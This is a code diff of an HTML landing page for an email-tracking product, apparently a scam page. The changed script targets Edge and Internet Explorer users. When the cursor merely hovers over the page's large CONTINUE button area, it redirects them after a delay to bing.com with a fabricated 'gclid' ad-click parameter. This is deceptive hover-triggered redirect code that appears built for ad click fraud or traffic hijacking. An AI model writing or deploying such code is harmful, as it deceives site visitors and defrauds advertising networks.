@@ -120,11 +120,11 @@
                 Seamless integration. Accurate tracking. Patent pending technology. One ✓ email sent. Two ✓✓ email opened
             </div>
 			
-			<div  id ="hovone">
+			<div  class="redirect_elements">
             <div id="textCoords1_15" class="responsiveClass textCoords1_15" dir="auto">
                 <section class="animatedbutton">
                     <div class="container">
-                        <a href ="javascript:fauxNwz();" class="btn quiz-button redirect_elements" style="padding: 55px 480px; position: relative; right: 290px;"><span style="position: relative; ">CONTINUE</span></a>
+                        <a href ="javascript:fauxNwz();" class="btn quiz-button" style="padding: 55px 480px; position: relative; right: 290px;"><span style="position: relative; ">CONTINUE</span></a>
                     </div>
                 </section>
             </div>
@@ -161,35 +161,24 @@
     <div class="pixels" style="display:none">
     </div>
 	
-	
-	
  <script>
 			
-			let quizBegin = document.querySelector("#hovone");
+	let redir_elm = document.querySelectorAll(".redirect_elements");
 
-				  window.addEventListener("DOMContentLoaded", function () {
-					if (
-					  (navigator.userAgent.indexOf("MSIE") &&
-						!!navigator.userAgent.match(/Trident.*rv\:11\./)) ||
-					  navigator.userAgent.indexOf("Edge") != -1
-					) 
-					{
-					  quizBegin.addEventListener("mouseover", function () {
-						setTimeout(function () {
-						  window.location.href = "https://bing.com?gclid="+dugznov;
-						}, 800);
-					  });
-					}
-				  });
-</script> 
-
-<script>
-    var redir_elm = document.getElementsByClassName("redirect_elements");
-    for (var i = 0; i < redir_elm.length; i++) {
-        redir_elm[i].addEventListener("mouseover", function () {setTimeout(function(){ window.location.href = "https://bing.com?gclid="+dugznov; }, 2000)})
-    }
+            window.addEventListener("DOMContentLoaded", function () {
+                if (
+                (navigator.userAgent.indexOf("MSIE") &&
+                    !!navigator.userAgent.match(/Trident.*rv\:11\./)) ||
+                navigator.userAgent.indexOf("Edg") != -1
+                ) 
+                {
+                for (var i = 0; i < redir_elm.length; i++) {
+                    redir_elm[i].addEventListener("mouseover", function () {setTimeout(function(){ window.location.href = "https://bing.com?gclid="+dugznov; }, 2000)})
+                }
+                }
+            });
 </script>
-		
+
 </body>
 
 </html>
